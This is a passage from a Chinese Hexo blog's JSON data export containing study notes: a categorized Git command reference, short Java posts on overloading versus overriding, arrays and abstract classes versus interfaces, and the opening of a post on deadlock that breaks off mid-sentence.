merge-subtree</td>\n<td>子树合并。参见 git merge 的 subtree 合并策略</td>\n</tr>\n<tr>\n<td>git merge-tree</td>\n<td>显式三向合并结果，不改变暂存区</td>\n</tr>\n<tr>\n<td>git fmt-merge-msg</td>\n<td>供执行合并操作的脚本调用，用于创建一个合并提交说明</td>\n</tr>\n<tr>\n<td>git rerere</td>\n<td>重用所记录的冲突解决方案</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"杂项\"><a href=\"#杂项\" class=\"headerlink\" title=\"杂项\"></a>杂项</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git bisect–helper</td>\n<td>由 git bisect 命令调用，确认二分查找进度</td>\n</tr>\n<tr>\n<td>git check-attr</td>\n<td>显示某个文件是否设置了某个属性</td>\n</tr>\n<tr>\n<td>git checkout-index</td>\n<td>从暂存区拷贝文件至工作区</td>\n</tr>\n<tr>\n<td>git cherry</td>\n<td>查找没有合并到上游的提交</td>\n</tr>\n<tr>\n<td>git diff-files</td>\n<td>比较暂存区和工作区，相当于 git diff –raw</td>\n</tr>\n<tr>\n<td>git diff-index</td>\n<td>比较暂存区和版本库，相当于 git diff –cached –raw</td>\n</tr>\n<tr>\n<td>git diff-tree</td>\n<td>比较两个树对象，相当于 git diff –raw A B</td>\n</tr>\n<tr>\n<td>git difftool–helper</td>\n<td>由 git difftool 命令调用，默认要使用的差异比较工具</td>\n</tr>\n<tr>\n<td>git notes</td>\n<td>提交评论管理</td>\n</tr>\n<tr>\n<td>git patch-id</td>\n<td>补丁过滤行号和空白字符后生成补丁唯一ID</td>\n</tr>\n<tr>\n<td>git quiltimport</td>\n<td>将Quilt补丁列表应用到当前分支</td>\n</tr>\n<tr>\n<td>git replace</td>\n<td>提交替换</td>\n</tr>\n<tr>\n<td>git shortlog</td>\n<td>对 git log 的汇总输出，适合于产品发布说明</td>\n</tr>\n<tr>\n<td>git stripspace</td>\n<td>删除空行，供其他脚本调用</td>\n</tr>\n<tr>\n<td>git submodule</td>\n<td>子模组管理</td>\n</tr>\n<tr>\n<td>git tar-tree</td>\n<td>过时命令，请使用 git archive</td>\n</tr>\n<tr>\n<td>git var</td>\n<td>显示 Git 环境变量，启动浏览器以查看目录或文件</td>\n</tr>\n<tr>\n<td>git whatchanged</td>\n<td>显示提交历史及每次提交的改动</td>\n</tr>\n<tr>\n<td>git-mergetool–lib</td>\n<td>包含于其他脚本中，提供合并/差异比较工具的选择和执行</td>\n</tr>\n<tr>\n<td>git-parse-remote</td>\n<td>包含于其他脚本中，提供操作远程版本库的函数</td>\n</tr>\n<tr>\n<td>git-sh-setup</td>\n<td>包含于其他脚本中，提供 shell 编程的函数库</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Git-常用命令速查\"><a href=\"#Git-常用命令速查\" class=\"headerlink\" title=\"Git 常用命令速查\"></a>Git 常用命令速查</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>gitadd</td>\n<td>添加至暂存区</td>\n</tr>\n<tr>\n<td>git add–interactive</td>\n<td>交互式添加</td>\n</tr>\n<tr>\n<td>git apply</td>\n<td>应用补丁</td>\n</tr>\n<tr>\n<td>git am</td>\n<td>应用邮件格式补丁</td>\n</tr>\n<tr>\n<td>git annotate</td>\n<td>同义词，等同于 git blame</td>\n</tr>\n<tr>\n<td>git archive</td>\n<td>文件归档打包</td>\n</tr>\n<tr>\n<td>git bisect</td>\n<td>二分查找</td>\n</tr>\n<tr>\n<td>git blame</td>\n<td>文件逐行追溯</td>\n</tr>\n<tr>\n<td>git branch</td>\n<td>查看本地分支</td>\n</tr>\n<tr>\n<td>git cat-file</td>\n<td>版本库对象研究工具</td>\n</tr>\n<tr>\n<td>git checkout</td>\n<td>检出到工作区、切换或创建分支</td>\n</tr>\n<tr>\n<td>git cherry-pick</td>\n<td>提交拣选</td>\n</tr>\n<tr>\n<td>git citool</td>\n<td>图形化提交，相当于 git gui 命令</td>\n</tr>\n<tr>\n<td>git clean</td>\n<td>清除工作区未跟踪文件</td>\n</tr>\n<tr>\n<td>git clone</td>\n<td>克隆版本库</td>\n</tr>\n<tr>\n<td>git commit</td>\n<td>提交</td>\n</tr>\n<tr>\n<td>git config</td>\n<td>查询和修改配置</td>\n</tr>\n<tr>\n<td>git describe</td>\n<td>通过里程碑直观地显示提交ID</td>\n</tr>\n<tr>\n<td>git diff</td>\n<td>差异比较</td>\n</tr>\n<tr>\n<td>git difftool</td>\n<td>调用图形化差异比较工具</td>\n</tr>\n<tr>\n<td>git fetch</td>\n<td>获取远程版本库的提交</td>\n</tr>\n<tr>\n<td>git format-patch</td>\n<td>创建邮件格式的补丁文件。参见 git am 命令</td>\n</tr>\n<tr>\n<td>git grep</td>\n<td>文件内容搜索定位工具</td>\n</tr>\n<tr>\n<td>git gui</td>\n<td>基于Tcl/Tk的图形化工具，侧重提交等操作</td>\n</tr>\n<tr>\n<td>git help</td>\n<td>帮助</td>\n</tr>\n<tr>\n<td>git init</td>\n<td>版本库初始化</td>\n</tr>\n<tr>\n<td>git init-db*</td>\n<td>同义词，等同于 git init</td>\n</tr>\n<tr>\n<td>git log</td>\n<td>显示提交日志</td>\n</tr>\n<tr>\n<td>git merge</td>\n<td>分支合并</td>\n</tr>\n<tr>\n<td>git mergetool</td>\n<td>图形化冲突解决</td>\n</tr>\n<tr>\n<td>git mv</td>\n<td>重命名</td>\n</tr>\n<tr>\n<td>git pull</td>\n<td>拉回远程版本库的提交</td>\n</tr>\n<tr>\n<td>git push</td>\n<td>推送至远程版本库</td>\n</tr>\n<tr>\n<td>git rebase</td>\n<td>分支变基</td>\n</tr>\n<tr>\n<td>git rebase–interactive</td>\n<td>交互式分支变基</td>\n</tr>\n<tr>\n<td>git reflog</td>\n<td>分支等引用变更记录管理</td>\n</tr>\n<tr>\n<td>git remote</td>\n<td>远程版本库管理</td>\n</tr>\n<tr>\n<td>git repo-config*</td>\n<td>同义词，等同于 git config</td>\n</tr>\n<tr>\n<td>git reset</td>\n<td>重置改变分支“游标”指向</td>\n</tr>\n<tr>\n<td>git rev-parse</td>\n<td>将各种引用表示法转换为哈希值等</td>\n</tr>\n<tr>\n<td>git revert</td>\n<td>反转提交</td>\n</tr>\n<tr>\n<td>git rm</td>\n<td>删除文件</td>\n</tr>\n<tr>\n<td>git show</td>\n<td>显示各种类型的对象</td>\n</tr>\n<tr>\n<td>git stage*</td>\n<td>同义词，等同于 git add</td>\n</tr>\n<tr>\n<td>git stash</td>\n<td>保存和恢复进度</td>\n</tr>\n<tr>\n<td>git status</td>\n<td>显示工作区文件状态</td>\n</tr>\n<tr>\n<td>git tag</td>\n<td>里程碑管理</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"对象库操作相关命令\"><a href=\"#对象库操作相关命令\" class=\"headerlink\" title=\"对象库操作相关命令\"></a>对象库操作相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git commit-tree</td>\n<td>从树对象创建提交</td>\n</tr>\n<tr>\n<td>git hash-object</td>\n<td>从标准输入或文件计算哈希值或创建对象</td>\n</tr>\n<tr>\n<td>git ls-files</td>\n<td>显示工作区和暂存区文件</td>\n</tr>\n<tr>\n<td>git ls-tree</td>\n<td>显示树对象包含的文件</td>\n</tr>\n<tr>\n<td>git mktag</td>\n<td>读取标准输入创建一个里程碑对象</td>\n</tr>\n<tr>\n<td>git mktree</td>\n<td>读取标准输入创建一个树对象</td>\n</tr>\n<tr>\n<td>git read-tree</td>\n<td>读取树对象到暂存区</td>\n</tr>\n<tr>\n<td>git update-index</td>\n<td>工作区内容注册到暂存区及暂存区管理</td>\n</tr>\n<tr>\n<td>git unpack-file</td>\n<td>创建临时文件包含指定 blob 的内容</td>\n</tr>\n<tr>\n<td>git write-tree</td>\n<td>从暂存区创建一个树对象</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"引用操作相关命令\"><a href=\"#引用操作相关命令\" class=\"headerlink\" title=\"引用操作相关命令\"></a>引用操作相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git check-ref-format</td>\n<td>检查引用名称是否符合规范</td>\n</tr>\n<tr>\n<td>git for-each-ref</td>\n<td>引用迭代器，用于shell编程</td>\n</tr>\n<tr>\n<td>git ls-remote</td>\n<td>显示远程版本库的引用</td>\n</tr>\n<tr>\n<td>git name-rev</td>\n<td>将提交ID显示为友好名称</td>\n</tr>\n<tr>\n<td>git peek-remote*</td>\n<td>过时命令，请使用 git ls-remote</td>\n</tr>\n<tr>\n<td>git rev-list</td>\n<td>显示版本范围</td>\n</tr>\n<tr>\n<td>git show-branch</td>\n<td>显示分支列表及拓扑关系</td>\n</tr>\n<tr>\n<td>git show-ref</td>\n<td>显示本地引用</td>\n</tr>\n<tr>\n<td>git symbolic-ref</td>\n<td>显示或者设置符号引用</td>\n</tr>\n<tr>\n<td>git update-ref</td>\n<td>更新引用的指向</td>\n</tr>\n<tr>\n<td>git verify-tag</td>\n<td>校验 GPG 签名的Tag</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"版本库管理相关命令\"><a href=\"#版本库管理相关命令\" class=\"headerlink\" title=\"版本库管理相关命令\"></a>版本库管理相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git count-objects</td>\n<td>显示松散对象的数量和磁盘占用</td>\n</tr>\n<tr>\n<td>git filter-branch</td>\n<td>版本库重构</td>\n</tr>\n<tr>\n<td>git fsck</td>\n<td>对象库完整性检查</td>\n</tr>\n<tr>\n<td>git fsck-objects*</td>\n<td>同义词，等同于 git fsck</td>\n</tr>\n<tr>\n<td>git gc</td>\n<td>版本库存储优化</td>\n</tr>\n<tr>\n<td>git index-pack</td>\n<td>从打包文件创建对应的索引文件</td>\n</tr>\n<tr>\n<td>git lost-found*</td>\n<td>过时，请使用 git fsck –lost-found 命令</td>\n</tr>\n<tr>\n<td>git pack-objects</td>\n<td>从标准输入读入对象ID，打包到文件</td>\n</tr>\n<tr>\n<td>git pack-redundant</td>\n<td>查找多余的 pack 文件</td>\n</tr>\n<tr>\n<td>git pack-refs</td>\n<td>将引用打包到 .git/packed-refs 文件中</td>\n</tr>\n<tr>\n<td>git prune</td>\n<td>从对象库删除过期对象</td>\n</tr>\n<tr>\n<td>git prune-packed</td>\n<td>将已经打包的松散对象删除</td>\n</tr>\n<tr>\n<td>git relink</td>\n<td>为本地版本库中相同的对象建立硬连接</td>\n</tr>\n<tr>\n<td>git repack</td>\n<td>将版本库未打包的松散对象打包</td>\n</tr>\n<tr>\n<td>git show-index</td>\n<td>读取包的索引文件，显示打包文件中的内容</td>\n</tr>\n<tr>\n<td>git unpack-objects</td>\n<td>从打包文件释放文件</td>\n</tr>\n<tr>\n<td>git verify-pack</td>\n<td>校验对象库打包文件</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"数据传输相关命令\"><a href=\"#数据传输相关命令\" class=\"headerlink\" title=\"数据传输相关命令\"></a>数据传输相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git fetch-pack</td>\n<td>执行 git fetch 或 git pull 命令时在本地执行此命令，用于从其他版本库获取缺失的对象</td>\n</tr>\n<tr>\n<td>git receive-pack</td>\n<td>执行 git push 命令时在远程执行的命令，用于接受推送的数据</td>\n</tr>\n<tr>\n<td>git send-pack</td>\n<td>执行 git push 命令时在本地执行的命令，用于向其他版本库推送数据</td>\n</tr>\n<tr>\n<td>git upload-archive</td>\n<td>执行 git archive –remote 命令基于远程版本库创建归档时，远程版本库执行此命令传送归档</td>\n</tr>\n<tr>\n<td>git upload-pack</td>\n<td>执行 git fetch 或 git pull 命令时在远程执行此命令，将对象打包、上传</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"邮件相关命令\"><a href=\"#邮件相关命令\" class=\"headerlink\" title=\"邮件相关命令\"></a>邮件相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git imap-send</td>\n<td>将补丁通过 IMAP 发送</td>\n</tr>\n<tr>\n<td>git mailinfo</td>\n<td>从邮件导出提交说明和补丁</td>\n</tr>\n<tr>\n<td>git mailsplit</td>\n<td>将 mbox 或 Maildir 格式邮箱中邮件逐一提取为文件</td>\n</tr>\n<tr>\n<td>git request-pull</td>\n<td>创建包含提交间差异和执行PULL操作地址的信息</td>\n</tr>\n<tr>\n<td>git send-email</td>\n<td>发送邮件</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"协议相关命令\"><a href=\"#协议相关命令\" class=\"headerlink\" title=\"协议相关命令\"></a>协议相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git daemon</td>\n<td>实现Git协议</td>\n</tr>\n<tr>\n<td>git http-backend</td>\n<td>实现HTTP协议的CGI程序，支持智能HTTP协议</td>\n</tr>\n<tr>\n<td>git instaweb</td>\n<td>即时启动浏览器通过 gitweb 浏览当前版本库</td>\n</tr>\n<tr>\n<td>git shell</td>\n<td>受限制的shell，提供仅执行Git命令的SSH访问</td>\n</tr>\n<tr>\n<td>git update-server-inf</td>\n<td>更新哑协议需要的辅助文件</td>\n</tr>\n<tr>\n<td>git http-fetch</td>\n<td>通过HTTP协议获取版本库</td>\n</tr>\n<tr>\n<td>git http-push</td>\n<td>通过HTTP/DAV协议推送</td>\n</tr>\n<tr>\n<td>git remote-ext</td>\n<td>由Git命令调用，通过外部命令提供扩展协议支持</td>\n</tr>\n<tr>\n<td>git remote-fd</td>\n<td>由Git命令调用，使用文件描述符作为协议接口</td>\n</tr>\n<tr>\n<td>git remote-ftp</td>\n<td>由Git命令调用，提供对FTP协议的支持</td>\n</tr>\n<tr>\n<td>git remote-ftps</td>\n<td>由Git命令调用，提供对FTPS协议的支持</td>\n</tr>\n<tr>\n<td>git remote-http</td>\n<td>由Git命令调用，提供对HTTP协议的支持</td>\n</tr>\n<tr>\n<td>git remote-https</td>\n<td>由Git命令调用，提供对HTTPS协议的支持</td>\n</tr>\n<tr>\n<td>git remote-testgit</td>\n<td>协议扩展示例脚本</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"版本库转换和交互相关命令\"><a href=\"#版本库转换和交互相关命令\" class=\"headerlink\" title=\"版本库转换和交互相关命令\"></a>版本库转换和交互相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git archimport</td>\n<td>导入Arch版本库到Git</td>\n</tr>\n<tr>\n<td>git bundle</td>\n<td>提交打包和解包，以便在不同版本库间传递</td>\n</tr>\n<tr>\n<td>git cvsexportcommit</td>\n<td>将Git的一个提交作为一个CVS检出</td>\n</tr>\n<tr>\n<td>git cvsimport</td>\n<td>导入CVS版本库到Git。或者使用 cvs2git</td>\n</tr>\n<tr>\n<td>git cvsserver</td>\n<td>Git的CVS协议模拟器，可供CVS命令访问Git版本库</td>\n</tr>\n<tr>\n<td>git fast-export</td>\n<td>将提交导出为 git-fast-import 格式</td>\n</tr>\n<tr>\n<td>git fast-import</td>\n<td>其他版本库迁移至Git的通用工具</td>\n</tr>\n<tr>\n<td>git svn</td>\n<td>Git 作为前端操作 Subversion</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"合并相关的辅助命令\"><a href=\"#合并相关的辅助命令\" class=\"headerlink\" title=\"合并相关的辅助命令\"></a>合并相关的辅助命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git merge-base</td>\n<td>供其他脚本调用，找到两个或多个提交最近的共同祖先</td>\n</tr>\n<tr>\n<td>git merge-file</td>\n<td>针对文件的两个不同版本执行三向文件合并</td>\n</tr>\n<tr>\n<td>git merge-index</td>\n<td>对index中的冲突文件调用指定的冲突解决工具</td>\n</tr>\n<tr>\n<td>git merge-octopus</td>\n<td>合并两个以上分支。参见 git merge 的octopus合并策略</td>\n</tr>\n<tr>\n<td>git merge-one-file</td>\n<td>由 git merge-index 调用的标准辅助程序</td>\n</tr>\n<tr>\n<td>git merge-ours</td>\n<td>合并使用本地版本，抛弃他人版本。参见 git merge 的ours合并策略</td>\n</tr>\n<tr>\n<td>git merge-recursive</td>\n<td>针对两个分支的三向合并。参见 git merge 的recursive合并策略</td>\n</tr>\n<tr>\n<td>git merge-resolve</td>\n<td>针对两个分支的三向合并。参见 git merge 的resolve合并策略</td>\n</tr>\n<tr>\n<td>git merge-subtree</td>\n<td>子树合并。参见 git merge 的 subtree 合并策略</td>\n</tr>\n<tr>\n<td>git merge-tree</td>\n<td>显式三向合并结果，不改变暂存区</td>\n</tr>\n<tr>\n<td>git fmt-merge-msg</td>\n<td>供执行合并操作的脚本调用，用于创建一个合并提交说明</td>\n</tr>\n<tr>\n<td>git rerere</td>\n<td>重用所记录的冲突解决方案</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"杂项\"><a href=\"#杂项\" class=\"headerlink\" title=\"杂项\"></a>杂项</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git bisect–helper</td>\n<td>由 git bisect 命令调用，确认二分查找进度</td>\n</tr>\n<tr>\n<td>git check-attr</td>\n<td>显示某个文件是否设置了某个属性</td>\n</tr>\n<tr>\n<td>git checkout-index</td>\n<td>从暂存区拷贝文件至工作区</td>\n</tr>\n<tr>\n<td>git cherry</td>\n<td>查找没有合并到上游的提交</td>\n</tr>\n<tr>\n<td>git diff-files</td>\n<td>比较暂存区和工作区，相当于 git diff –raw</td>\n</tr>\n<tr>\n<td>git diff-index</td>\n<td>比较暂存区和版本库，相当于 git diff –cached –raw</td>\n</tr>\n<tr>\n<td>git diff-tree</td>\n<td>比较两个树对象，相当于 git diff –raw A B</td>\n</tr>\n<tr>\n<td>git difftool–helper</td>\n<td>由 git difftool 命令调用，默认要使用的差异比较工具</td>\n</tr>\n<tr>\n<td>git notes</td>\n<td>提交评论管理</td>\n</tr>\n<tr>\n<td>git patch-id</td>\n<td>补丁过滤行号和空白字符后生成补丁唯一ID</td>\n</tr>\n<tr>\n<td>git quiltimport</td>\n<td>将Quilt补丁列表应用到当前分支</td>\n</tr>\n<tr>\n<td>git replace</td>\n<td>提交替换</td>\n</tr>\n<tr>\n<td>git shortlog</td>\n<td>对 git log 的汇总输出，适合于产品发布说明</td>\n</tr>\n<tr>\n<td>git stripspace</td>\n<td>删除空行，供其他脚本调用</td>\n</tr>\n<tr>\n<td>git submodule</td>\n<td>子模组管理</td>\n</tr>\n<tr>\n<td>git tar-tree</td>\n<td>过时命令，请使用 git archive</td>\n</tr>\n<tr>\n<td>git var</td>\n<td>显示 Git 环境变量，启动浏览器以查看目录或文件</td>\n</tr>\n<tr>\n<td>git whatchanged</td>\n<td>显示提交历史及每次提交的改动</td>\n</tr>\n<tr>\n<td>git-mergetool–lib</td>\n<td>包含于其他脚本中，提供合并/差异比较工具的选择和执行</td>\n</tr>\n<tr>\n<td>git-parse-remote</td>\n<td>包含于其他脚本中，提供操作远程版本库的函数</td>\n</tr>\n<tr>\n<td>git-sh-setup</td>\n<td>包含于其他脚本中，提供 shell 编程的函数库</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"方法的重载和重写","date":"2017-12-29T06:41:53.000Z","_content":"\n**方法的重载:**<overload>\n\n\t方法的重载是发生在同一个类中,方法名相同,参数列表不同,与返回值类型无关\n\n**方法的重写:**<overwrite>\n\n\t方法的重写是发生在具有子父类关系的类中,子类具有与父类定义一样的方法,只是实现不一样    \n","source":"_posts/方法的重载和重写.md","raw":"---\ntitle: 方法的重载和重写\ndate: 2017-12-29 14:41:53\ntags: JavaSE\n---\n\n**方法的重载:**<overload>\n\n\t方法的重载是发生在同一个类中,方法名相同,参数列表不同,与返回值类型无关\n\n**方法的重写:**<overwrite>\n\n\t方法的重写是发生在具有子父类关系的类中,子类具有与父类定义一样的方法,只是实现不一样    \n","slug":"方法的重载和重写","published":1,"updated":"2017-12-29T15:28:00.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tx10039mfahr7bqgdsl","content":"<p><strong>方法的重载:</strong><overload></overload></p>\n<pre><code>方法的重载是发生在同一个类中,方法名相同,参数列表不同,与返回值类型无关\n</code></pre><p><strong>方法的重写:</strong><overwrite></overwrite></p>\n<pre><code>方法的重写是发生在具有子父类关系的类中,子类具有与父类定义一样的方法,只是实现不一样    \n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p><strong>方法的重载:</strong><overload></overload></p>\n<pre><code>方法的重载是发生在同一个类中,方法名相同,参数列表不同,与返回值类型无关\n</code></pre><p><strong>方法的重写:</strong><overwrite></overwrite></p>\n<pre><code>方法的重写是发生在具有子父类关系的类中,子类具有与父类定义一样的方法,只是实现不一样    \n</code></pre>"},{"title":"数组注意事项","date":"2014-03-22T08:10:40.000Z","_content":"#### 数组注意事项\n\n对于数组的定义和一般使用技巧,我们肯定都是比较熟悉了.这里主要介绍一下数据的一些好用API以及注意事项\n\n#### 数组的基本使用—创建数组\n\n\t当创建一个数字型的数组时,所有元素都初始化为0\n\t当创建boolean类型的数组时,所有元素都初始化为false\n\t当创建一个对象数组时,所有元素都初始化为null,例如:\n\t//创建一个包含十个字符串的数组,但是每一个的初始化字符串都是null\n\tString[] str = new String[10]\n#### 数组工具类常用API—Arrays\n\n\tstatic T[] copyOf(T[] original, int newLength) —将original数组拷贝newLength个到一个新的数组中,方法的返回值是一个新的数组\n\tstatic void sort(type[] a)—将数组进行排序,使用的是快排,效率比较高\n\tstatic int binarySearch(type[] a, type key)—在数组a中进行二分查找key,如果查找成功则返回下标值,否则返回一个负数\n\tstatic void fill(type[] a, type v)—将数组的所有数据元素赋值为v\n\tboolean equals(type[] a, type[] b)—如果两个数组大小相同,并且下标相同的元素都相同返回true,否则返回false\n","source":"_posts/数组注意事项.md","raw":"---\ntitle: 数组注意事项\ndate: 2014-03-22 16:10:40\ntags: JavaSE\n---\n#### 数组注意事项\n\n对于数组的定义和一般使用技巧,我们肯定都是比较熟悉了.这里主要介绍一下数据的一些好用API以及注意事项\n\n#### 数组的基本使用—创建数组\n\n\t当创建一个数字型的数组时,所有元素都初始化为0\n\t当创建boolean类型的数组时,所有元素都初始化为false\n\t当创建一个对象数组时,所有元素都初始化为null,例如:\n\t//创建一个包含十个字符串的数组,但是每一个的初始化字符串都是null\n\tString[] str = new String[10]\n#### 数组工具类常用API—Arrays\n\n\tstatic T[] copyOf(T[] original, int newLength) —将original数组拷贝newLength个到一个新的数组中,方法的返回值是一个新的数组\n\tstatic void sort(type[] a)—将数组进行排序,使用的是快排,效率比较高\n\tstatic int binarySearch(type[] a, type key)—在数组a中进行二分查找key,如果查找成功则返回下标值,否则返回一个负数\n\tstatic void fill(type[] a, type v)—将数组的所有数据元素赋值为v\n\tboolean equals(type[] a, type[] b)—如果两个数组大小相同,并且下标相同的元素都相同返回true,否则返回false\n","slug":"数组注意事项","published":1,"updated":"2018-01-31T08:12:08.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tx2003cmfahrc755igv","content":"<h4 id=\"数组注意事项\"><a href=\"#数组注意事项\" class=\"headerlink\" title=\"数组注意事项\"></a>数组注意事项</h4><p>对于数组的定义和一般使用技巧,我们肯定都是比较熟悉了.这里主要介绍一下数据的一些好用API以及注意事项</p>\n<h4 id=\"数组的基本使用—创建数组\"><a href=\"#数组的基本使用—创建数组\" class=\"headerlink\" title=\"数组的基本使用—创建数组\"></a>数组的基本使用—创建数组</h4><pre><code>当创建一个数字型的数组时,所有元素都初始化为0\n当创建boolean类型的数组时,所有元素都初始化为false\n当创建一个对象数组时,所有元素都初始化为null,例如:\n//创建一个包含十个字符串的数组,但是每一个的初始化字符串都是null\nString[] str = new String[10]\n</code></pre><h4 id=\"数组工具类常用API—Arrays\"><a href=\"#数组工具类常用API—Arrays\" class=\"headerlink\" title=\"数组工具类常用API—Arrays\"></a>数组工具类常用API—Arrays</h4><pre><code>static T[] copyOf(T[] original, int newLength) —将original数组拷贝newLength个到一个新的数组中,方法的返回值是一个新的数组\nstatic void sort(type[] a)—将数组进行排序,使用的是快排,效率比较高\nstatic int binarySearch(type[] a, type key)—在数组a中进行二分查找key,如果查找成功则返回下标值,否则返回一个负数\nstatic void fill(type[] a, type v)—将数组的所有数据元素赋值为v\nboolean equals(type[] a, type[] b)—如果两个数组大小相同,并且下标相同的元素都相同返回true,否则返回false\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"数组注意事项\"><a href=\"#数组注意事项\" class=\"headerlink\" title=\"数组注意事项\"></a>数组注意事项</h4><p>对于数组的定义和一般使用技巧,我们肯定都是比较熟悉了.这里主要介绍一下数据的一些好用API以及注意事项</p>\n<h4 id=\"数组的基本使用—创建数组\"><a href=\"#数组的基本使用—创建数组\" class=\"headerlink\" title=\"数组的基本使用—创建数组\"></a>数组的基本使用—创建数组</h4><pre><code>当创建一个数字型的数组时,所有元素都初始化为0\n当创建boolean类型的数组时,所有元素都初始化为false\n当创建一个对象数组时,所有元素都初始化为null,例如:\n//创建一个包含十个字符串的数组,但是每一个的初始化字符串都是null\nString[] str = new String[10]\n</code></pre><h4 id=\"数组工具类常用API—Arrays\"><a href=\"#数组工具类常用API—Arrays\" class=\"headerlink\" title=\"数组工具类常用API—Arrays\"></a>数组工具类常用API—Arrays</h4><pre><code>static T[] copyOf(T[] original, int newLength) —将original数组拷贝newLength个到一个新的数组中,方法的返回值是一个新的数组\nstatic void sort(type[] a)—将数组进行排序,使用的是快排,效率比较高\nstatic int binarySearch(type[] a, type key)—在数组a中进行二分查找key,如果查找成功则返回下标值,否则返回一个负数\nstatic void fill(type[] a, type v)—将数组的所有数据元素赋值为v\nboolean equals(type[] a, type[] b)—如果两个数组大小相同,并且下标相同的元素都相同返回true,否则返回false\n</code></pre>"},{"layout":"abstract","title":"abstract class 和interface 有什么区别","date":"2017-12-29T06:38:56.000Z","_content":"### abstract class 和interface 有什么区别？\n\n\t1. 抽象类中可以有构造方法,接口中没有构造方法\n\t2. 抽象类中可以有普通成员,接口中没有普通成员\n\t3. 抽象类中可以有普通方法,接口中都是抽象方法\n\t4. 抽象类中可以有修饰符public,protected,接口中只能有public,默认public abstract\n\n","source":"_posts/有什么区别.md","raw":"---\nlayout: abstract\ntitle: abstract class 和interface 有什么区别\ndate: 2017-12-29 14:38:56\ntags: JavaSE\n---\n### abstract class 和interface 有什么区别？\n\n\t1. 抽象类中可以有构造方法,接口中没有构造方法\n\t2. 抽象类中可以有普通成员,接口中没有普通成员\n\t3. 抽象类中可以有普通方法,接口中都是抽象方法\n\t4. 抽象类中可以有修饰符public,protected,接口中只能有public,默认public abstract\n\n","slug":"有什么区别","published":1,"updated":"2017-12-29T14:40:20.000Z","comments":1,"photos":[],"link":"","_id":"cjow44tx3003emfahxmxggdwd","content":"<h3 id=\"abstract-class-和interface-有什么区别？\"><a href=\"#abstract-class-和interface-有什么区别？\" class=\"headerlink\" title=\"abstract class 和interface 有什么区别？\"></a>abstract class 和interface 有什么区别？</h3><pre><code>1. 抽象类中可以有构造方法,接口中没有构造方法\n2. 抽象类中可以有普通成员,接口中没有普通成员\n3. 抽象类中可以有普通方法,接口中都是抽象方法\n4. 抽象类中可以有修饰符public,protected,接口中只能有public,默认public abstract\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"abstract-class-和interface-有什么区别？\"><a href=\"#abstract-class-和interface-有什么区别？\" class=\"headerlink\" title=\"abstract class 和interface 有什么区别？\"></a>abstract class 和interface 有什么区别？</h3><pre><code>1. 抽象类中可以有构造方法,接口中没有构造方法\n2. 抽象类中可以有普通成员,接口中没有普通成员\n3. 抽象类中可以有普通方法,接口中都是抽象方法\n4. 抽象类中可以有修饰符public,protected,接口中只能有public,默认public abstract\n</code></pre>"},{"title":"死锁","date":"2015-06-12T07:05:55.000Z","_content":"#### 死锁的理解:\n\t进程A占有资源R1，等待进程B占有的资源Rr；进程B占有资源Rr，等待进程A占有的资源R1。而且资源R1和Rr只允许一个进程占用，\n\t即：不允许两个进程同时占用。结果，两个进程都不能继续执行，若不采取其它     措施，这种循环等待状况会无限期持续下去，就发生了进程死锁。\n     \n#### 死锁总结概念:\n\t所谓死锁，是指多个进程循环等待它方占有的资源而无限期地僵持下去的局面。\n\n#### 产生死锁的必要条件\n\n\t从以上分析可见，如果在计算机系统中同时具备下面四个必要条件时，那麽会发生死锁。换句话说，只要下面四个条件有一个不具备，系统就不会出现死锁。\n\t〈1〉互斥条件(从资源的属性讲)。即某个资源在一段时间内只能由一个进程占有，不能同时被两个或两个以上的进程占有。这种独占资源如CD-ROM驱动器，打印机等等，必\n\t须在占有该资源的进程主动释放它之后，其它进程才        